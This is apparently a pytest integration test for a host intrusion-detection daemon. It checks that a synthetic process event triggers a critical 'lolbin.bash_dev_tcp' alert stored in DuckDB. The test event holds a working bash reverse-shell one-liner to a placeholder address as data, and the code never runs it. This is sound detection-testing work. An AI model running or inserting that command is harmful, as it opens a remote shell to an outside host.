"""End-to-end: synthetic reverse-shell event → rule fires → alert in DuckDB."""

from __future__ import annotations

import json
import signal
import subprocess
import sys
import time
from datetime import UTC, datetime
from pathlib import Path

import pytest

from inspectord.ids import uuid7
from inspectord.storage.db import Database


@pytest.mark.integration
def test_reverse_shell_event_fires_alert(tmp_path: Path) -> None:
    var = tmp_path / "var"
    var.mkdir()

    synth_event = {
        "schema_version": "1.0.0",
        "ts": datetime.now(UTC).isoformat(),
        "event_id": str(uuid7()),
        "kind": "event",
        "category": ["process"],
        "type": ["start"],
        "action": "process_start",
        "severity": "info",
        "module": "process_collector",
        "process": {
            "pid": 9999,
            "name": "bash",
            "command_line": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1",
        },
        "labels": [],
    }

    # Write events to a separate JSON file: TOML inline tables cannot express
    # values that are themselves arrays (e.g. category/type/labels), so we pass
    # the path to the file via events_file instead of embedding inline.
    events_file = tmp_path / "synth_events.json"
    events_file.write_text(json.dumps([synth_event]))

    config_path = tmp_path / "inspectord.toml"
    config_path.write_text(
        f"""
version = "1.0.0"

[storage]
db_path = "{var / "inspectord.duckdb"}"
journal_dir = "{var / "journal"}"

[ipc]
socket_path = "{var / "inspectord.sock"}"
allowed_uids = []

[[workers]]
name = "synthetic_emitter"
module = "inspectord.workers.synthetic_emitter"

[workers.config]
events_file = "{events_file}"
delay_s = 0.1
""".strip()
    )

    proc = subprocess.Popen(
        [sys.executable, "-m", "inspectord", "--config", str(config_path)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    sock = var / "inspectord.sock"
    deadline = time.monotonic() + 10
    while time.monotonic() < deadline and not sock.exists():
        time.sleep(0.1)
    assert sock.exists(), "daemon never started"

    # Wait for the synthetic emitter to push its event through.
    time.sleep(2.5)

    proc.send_signal(signal.SIGTERM)
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()

    db_path = var / "inspectord.duckdb"
    deadline = time.monotonic() + 10
    found = False
    while time.monotonic() < deadline and not found:
        if db_path.exists():
            with Database(db_path) as db:
                rows = db.query(
                    "SELECT rule_id, severity FROM alerts WHERE rule_id = 'lolbin.bash_dev_tcp'"
                ).fetchall()
            if rows and rows[0][1] == "critical":
                found = True
                break
        time.sleep(0.2)
    assert found, "reverse-shell rule never produced an alert"
